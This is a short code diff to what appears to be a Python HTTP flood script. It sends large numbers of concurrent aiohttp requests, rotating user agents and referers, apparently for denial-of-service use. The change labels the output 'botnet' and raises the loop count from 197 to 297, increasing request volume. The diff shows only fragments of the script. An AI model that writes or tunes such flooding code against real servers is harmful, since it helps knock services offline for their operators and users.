@@ -37,10 +37,10 @@ async def make_request(session, method, url, headers, count):
     try:
         async with session.request(method, url, headers=headers) as response:
             if response.status == 200:
-                print(f"Request #{count} sent successfully")
+                print(f"Request botnet #{count} sent successfully")
             return response.status
     except Exception as e:
-        print(f"Request #{count} failed: {e}")
+        print(f"Request  #{count} failed: {e}")
 
 async def main():
     user_agents = await load_list_from_file('useragents.txt')
@@ -51,7 +51,7 @@ async def main():
 
     async with aiohttp.ClientSession() as session:
         tasks = []
-        for _ in range(197):
+        for _ in range(297):
             for method in methods:
                 user_agent = random.choice(user_agents)
                 referer = random.choice(referers)
